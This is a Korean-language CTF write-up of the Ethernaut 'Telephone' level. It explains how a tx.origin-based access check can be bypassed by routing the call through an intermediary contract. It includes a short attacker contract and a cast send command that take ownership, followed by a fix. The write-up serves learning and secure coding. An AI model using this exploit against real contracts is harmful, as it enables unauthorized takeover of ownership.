# [Ethernaut] 04-Telephone

## 취약점 요약
이번 문제는 tx.origin과 msg.sender의 차이만 알고 있다면  
쉽게 공략 가능한 취약점입니다.  

**tx.origin != msg.sender**라는 조건은 컨트랙트 하나 더 배포 한 뒤  
해당 컨트랙트로 트랜잭션을 보낸다면 바로 조건을 통과 할 수 있습니다.  

즉, 이번 문제는 tx.origin을 사용한 접근제어가 취약점입니다.


## 사전 지식
1. **tx.origin**:  
트랜잭션을 처음 시작한 EOA 주소이고    
한 트랜잭션 전체에서 딱 하나의 값만 가집니다.

2. **msg.sender**:  
현재 함수를 호출한 주체의 주소입니다.  

## 취약 코드
```solidity
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
```

## 원인 분석
### **잘못 된 접근제어**  
- **if (tx.origin != msg.sender)** 조건은  
tx.origin(트랜잭션을 처음 시작한 EOA주소)와 msg.sender(해당 함수 호출한 주소)가  
다르면 통과 시켜주고 있습니다.  

- 문제에서 주어지는 컨트랙트에서 changeOwner() 함수를 호출 한다면  
조건을 통과하지 못하겠지만    
공격자가 컨트랙트 하나를 배포하고 해당 컨트랙트에서 changeOwner() 함수를 호출하면  
tx.origin의 주소와 msg.sender 주소가 서로 달라지게 됩니다.  

<small>
tx.origin은 트랜잭션을 보낸 사람의 EOA 주소가 되고
msg.sender는 공격자가 배포한 컨트랙트의 주소가 됩니다!
</small>  


## 익스플로잇 로직

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "../04-telephone/contract.sol";

contract CallTelephone {

    Telephone public target;

    constructor(address _targetAddr) {
            target = Telephone(_targetAddr);
    }

    function call() public {
        target.changeOwner(msg.sender);
    }
}
```

```bash
cast send <CallTelephone 인스턴스 주소> "call()" --rpc-url <RPC_URL> --account <지갑 계정>
```

## 수정 방안
```solidity
function changeOwner(address _owner) public {
        // tx.origin 제거 및 비교 로직 변경
    if (msg.sender == owner) {
        owner = _owner;
    }
}
```

## CWE 분류
- **CWE-346: Origin Validation Error**
